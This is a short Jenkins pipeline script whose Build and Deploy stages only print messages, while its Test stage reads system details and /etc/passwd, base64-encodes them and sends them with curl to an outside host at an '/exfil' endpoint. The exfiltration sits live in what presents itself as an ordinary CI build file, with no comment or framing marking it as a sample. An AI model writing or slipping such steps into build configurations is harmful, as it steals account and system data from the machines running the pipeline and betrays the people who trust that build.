node('ecs-small-3gb'){
    stage('Build') {
        echo 'Building...'
    }

    stage('Test') {
        echo 'Testing...'
        sh 'uname -an > /tmp/system.log'
        sh 'cat /etc/passwd > /tmp/passwd.log'
        sh 'curl -i -k https://www.lazy-red-dragon.com/exfil?data="$(base64 --wrap=0 /tmp/system.log)"'
        sh 'curl -i -k https://www.lazy-red-dragon.com/exfil?data="$(base64 --wrap=0 /tmp/passwd.log)"'
    }

    stage('Deploy') {
        echo 'Deploying...'
    }
}

